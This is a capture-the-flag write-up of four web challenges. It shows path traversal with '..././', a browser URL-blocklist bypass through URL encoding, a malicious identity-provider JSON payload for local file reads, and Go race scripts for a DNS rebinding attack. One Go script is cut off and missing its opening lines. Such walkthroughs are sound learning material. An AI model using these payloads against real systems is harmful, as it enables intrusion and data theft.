We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them.

# web/Password Manager (357 Solves)
This was the "baby" Web challenge. I managed to get first blood on this with a time of   
3 Minutes, 38 Seconds which I was pretty pleased about!

## Analyzing the Source
The first thing I did when the CTF started was to download the challenge source. Opening it in my IDE I immediately noticed a reference to path traversal.

```go
func pages(w http.ResponseWriter, r *http.Request) {
	// You. Shall. Not. Path traverse!
	path := PathReplacer.Replace(r.URL.Path)

	if path == "/" {
		homepage(w, r)
		return
	}

	if path == "/login" {
		login(w, r)
		return
	}

	if path == "/getpasswords" {
		getpasswords(w, r)
		return
	}

	fullPath := "./pages" + path

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		notfound(w, r)
		return
	}

	http.ServeFile(w, r, fullPath)
}
```

I saw the concatenation with `fullPath` and the reference to `http.ServeFile` and realized that whatever path we passed would be literally served. Next, I noticed the `PathReplacer` and saw its source:

```go
var  PathReplacer  =  strings.NewReplacer(

"../", "",

)
```

So I figured this would only do a single replace of `../` and we could bypass by nesting this as `..././`  and next we just needed to figure out where the flag was.

Well, the source file references a `users.json` where presumably credentials are stored. Sending a `GET /..././users.json` provides us with the following:

```json
{
    "skat": "rf=easy-its+just&spicysines123!@"
}
```

When we login with this user/pass combo we can find the flag.

`irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`

# web/Political (152 Solves)
This next challenge was initially broken but was later fixed. It was a little bit painful and I burnt a lot of time trying to debug thinking there was something missing. We can create a token and it gets added to a dictionary and assigned the value `False` but if we can send a request to `/giveflag` with our token and the admin cookies then we can set it to true and retrieve it.

## Analyzing the Source
So after generating a token `2123feca33c077329b773d226cbdf1b5` I checked the source to see how the admin bot could give me a cookie.

```python
@app.route("/giveflag")
def hello_world():
    if "token" not in request.args or "admin" not in request.cookies:
        return "Who are you?"

    token = request.args["token"]
    admin = request.cookies["admin"]
    if token not in valid_tokens or admin != ADMIN:
        return "Why are you?"

    valid_tokens[token] = True
    return "GG"
```

So, we need to get it to pass `token` as a request argument (GET parameter) and have the admin cookie (the bot already assigns this). Then we need to set the `token` value to our token (`2123feca33c077329b773d226cbdf1b5`) and it should work. That seems pretty simple. We can send it to `/giveflag?token=2123feca33c077329b773d226cbdf1b5` and we will be done?

## Chrome Policies
I figured out that the reason this wasn't working was due to a browser policy. It is stored in the `policies.json` file and added to the browser files during build time (see Dockerfile).

```json
{
"URLBlocklist": ["*/giveflag", "*?token=*"]
}
```

From what I read about Chrome policies, these rules are globs. To interpret this; `*/giveflag` blocks a URL which contains `/giveflag` literally and anything preceding it. This is pretty simple, however `*?token=*` is deceiving. In this case the `?` means is globbed as a single character. This means that if you tried to bypass this filter by doing something like `?abc=xyz&token=...` it wouldn't work as it would still match this rule!

In the end, I realized that URL encoding worked for both cases.
`https://political-web.chal.irisc.tf/%67iveflag?%74oken=2123feca33c077329b773d226cbdf1b5`

Once I send the bot to this URL, I can return to submit my token and retrieve the flag.

# web/Bad Todo (75 Solves)
This challenge really wasn't all that hard. Most of the annoyance was setting up endpoints with the correct format on a webhook. The actual vulnerability was reasonably clear once you managed to authenticate.

## Analyzing the Source
I firstly noticed this function `getStoragePath` in `storage.js` which was seemingly vulnerable to local file disclosure.

```js
export function getStoragePath(idp, sub) {
    const first2 = sub.substring(0, 2);
    const rest = sub.substring(2);

    const path = `${sha256sum(idp)}/${encodeURIComponent(first2)}/${encodeURIComponent(rest)}`;
    return sanitizePath(path);
}
```

If we could control either `idp` or `sub` then we could abuse this. Immediately reading this, it becomes clear that controlling `idp` isn't all that useful since it is passed through `sha256sum` before it ever gets used. However, controlling `sub` would be sufficient. It cuts `sub` into two parts, namely `first2` and `rest` which should be fine for us. If we pass just `..flag` it will load the flag!

So now I wanted to work backwards and find a function which calls `getStoragePath` but allows us to control `sub` value. It must also use the return value in such a way that we can see it.

## Finding getUserTodos
Many of the functions call this but one which stood out to me was `getUserTodos` which gets called in `app.js` like so:
```js
return res.render("todos.ejs", {
    name,
    todos: await getUserTodos(userInfo.idpUrl, userInfo.userId)
});
```
This function will pass `userInfo.userId` into `getStoragePath` and return its value. This also renders the value whenever we view our todo list. Next, we only need to find a way to modify `userInfo.userId` to abuse it.

## Dealing With Authentication
Firstly, we need to get a session. To do so, we need to return JSON containing the following keys: `issuer`, `authorization_endpoint`, `token_endpoint` and `userinfo_endpoint`.

The `issuer` will be our `idpURL` that we can use by pointing it to our webhook. The `authorization_endpoint` should point to the challenge's `auth_redirect` so it can automatically redirect us to the next stage. The `token_endpoint` can also point to our webhook. Finally, the `userinfo_endpoint` can also point to our webhook so we can control its values. Once we return that, we will get a session (from `/start` endpoint) and can proceed to `/auth_redirect` flow:

```js
app.get("/auth_redirect", asyncHandler(async (req, res) => {
    if (!req.cookies.session) return res.end("No session");
    if (req.cookies.session !== req.query.state) return res.end("Bad state");
    if (req.query.error) {
        return res.end("identity provider gave us an error.");
    }
    
    const sessionDetails = await lookupSession(req.cookies.session);
    const response = await safeJson(sessionDetails.idpUrl + "/.well-known/openid-configuration");
    if (!response.token_endpoint) return res.end("No token endpoint");
    if (!response.userinfo_endpoint) return res.end("No user info endpoint");

    const search = new URLSearchParams();
    search.append("grant_type", "authorization_code");
    search.append("code", req.query.code);
    search.append("redirect_uri", process.env.BASE + "/auth_redirect");
    search.append("client_id", sessionDetails.clientId);
    
    const tokenResponse = await safeJson(response.token_endpoint, {
        method: "POST",
        body: search.toString(),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });

    if (!tokenResponse || !tokenResponse.access_token || !tokenResponse.token_type) return res.end("Bad token response");

    const userInfo = await safeJson(response.userinfo_endpoint, {
        headers: {
            "Authorization": `${tokenResponse.token_type} ${tokenResponse.access_token}`
        }
    });

    if (!userInfo || !userInfo.sub) return res.end("user has no sub");

    await successfulLogin(req.cookies.session, userInfo);
    res.setHeader("Location", `/`)
    res.sendStatus(302);
}));
```
To abuse this, we want to return an `access_token` and a `token_type` which don't really matter as long as they're defined. Finally, the value of `sub` will be passed into our function which retrieves todos (vulnerable to the LFD).

## Final Payload

```json
{"issuer":"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0","authorization_endpoint":"https://bad-todo-web.chal.irisc.tf/auth_redirect","token_endpoint":"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0","userinfo_endpoint":"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0","access_token":"lmao","token_type":"Bearer","sub":"..flag"}
```

By hosting this on our webhook and using that as our issuer URL when signing up, we can read the flag file.

# web/webwebhookhook (16 Solves)
This was probably the most interesting challenge in my opinion. It took me some time and I went down a short rabbit hole of considering request smuggling vulnerabilities but it turns out the actual issue is in relation to Java's `URL.equals()` which apparently does a DNS-level comparison (see [here](https://news.ycombinator.com/item?id=21765788)).

## Analyzing the Source
```java
package tf.irisc.chal.webwebhookhook.controller

import org.springframework.http.MediaType
import org.springframework.stereotype.Controller
import org.springframework.ui.Model
import org.springframework.web.bind.annotation.*
import tf.irisc.chal.webwebhookhook.State
import tf.irisc.chal.webwebhookhook.StateType
import java.net.HttpURLConnection
import java.net.URI

@Controller
class MainController {

    @GetMapping("/")
    fun home(model: Model): String {
        return "home.html"
    }

    @PostMapping("/webhook")
    @ResponseBody
    fun webhook(@RequestParam("hook") hook_str: String, @RequestBody body: String, @RequestHeader("Content-Type") contentType: String, model: Model): String {
        var hook = URI.create(hook_str).toURL();
        for (h in State.arr) {
            if(h.hook == hook) {
                var newBody = h.template.replace("_DATA_", body);
                var conn = hook.openConnection() as? HttpURLConnection;
                if(conn === null) break;
                conn.requestMethod = "POST";
                conn.doOutput = true;
                conn.setFixedLengthStreamingMode(newBody.length);
                conn.setRequestProperty("Content-Type", contentType);
                conn.connect()
                conn.outputStream.use { os ->
                    os.write(newBody.toByteArray())
                }

                return h.response
            }
        }
        return "{\"result\": \"fail\"}"
    }

    @PostMapping("/create", consumes = [MediaType.APPLICATION_JSON_VALUE])
    @ResponseBody
    fun create(@RequestBody body: StateType): String {
        for(h in State.arr) {
            if(body.hook == h.hook)
                return "{\"result\": \"fail\"}"
        }
        State.arr.add(body)
        return "{\"result\": \"ok\"}"
    }
}
```

And that's basically it! I love a short challenge that requires you to think outside the box and this definitely was the case here. You will notice that we iterate over every webhook in the array and then compare the URLs. If they are equal, we will send a request.

The trick here is knowing where the DNS resolves will occur. During the iteration it will compare the hook URL with our input and resolve the DNS here. Next, it replaces our template and finally it will do another DNS resolve to send the request.

The flag is stored in a webhook assigned to `example.com` which has IP address `93.184.215.14` and so what we would like here is for our domain to initially resolve to this IP (thus passing the equality check) but then change back to our webhook before it sends the request with the flag. This is known as a DNS rebinding attack.

We can expand the race window here by having a large body so the replace operation in the template takes a bit longer. I ended up having to write my exploits in Golang to achieve the race.

        "bytes"

        value = "A"
        size  = 500000
        workers = 10 // Number of concurrent goroutines
)

func main() {
        data := map[string]string{
                "abc": repeat(value, size),
        }

        payload, _ := json.Marshal(data)

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for {
                                resp, err := http.Post(url, "application/json", bytes.NewBuffer(payload))
                                if err != nil {
                                        fmt.Println("Error:", err)
                                        continue
                                }
                                resp.Body.Close()
                                fmt.Println("Status:", resp.Status)
                        }
                }()
        }
        wg.Wait()
}

func repeat(s string, count int) string {
        var result bytes.Buffer
        for i := 0; i < count; i++ {
                result.WriteString(s)
        }
        return result.String()
}
```
This `probe.go` script will consistently probe the webhook passing in my `http://pwn.fl7mhi6b.requestrepo.com/admin` which has an A record pointing to `93.184.215.14`.

```go
package main

import (
        "bytes"
        "encoding/json"
        "fmt"
        "math/rand"
        "net/http"
        "sync"
        "time"
)

const (
        url     = "https://webwebhookhook-5dbcb929250a3fff.i.chal.irisc.tf/create"
        workers = 10 // Number of concurrent goroutines
)

func main() {
        rand.Seed(time.Now().UnixNano())
        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for {
                                token := generateToken(32)
                                data := map[string]string{
                                        "hook":     fmt.Sprintf("http://pwn.fl7mhi6b.requestrepo.com/%s", token),
                                        "template": "",
                                        "response": "",
                                }

                                payload, _ := json.Marshal(data)
                                resp, err := http.Post(url, "application/json", bytes.NewBuffer(payload))
                                if err != nil {
                                        fmt.Println("Error:", err)
                                        continue
                                }
                                resp.Body.Close()
                                fmt.Println("Status:", resp.Status)
                        }
                }()
        }
        wg.Wait()
}

func generateToken(length int) string {
        const charset = "abcdef0123456789"
        result := make([]byte, length*2)
        for i := range result {
                result[i] = charset[rand.Intn(len(charset))]
        }
        return string(result)
}
```

This `dns_refresh.go` will run in parallel and simply creates new webhooks with the same requestrepo link. The purpose of this is so that it will be forced to resolve the DNS again and refresh it.

Running them in parallel and then removing the A record pointing to `example.com` will eventually give us the flag when the TTL is surpassed.
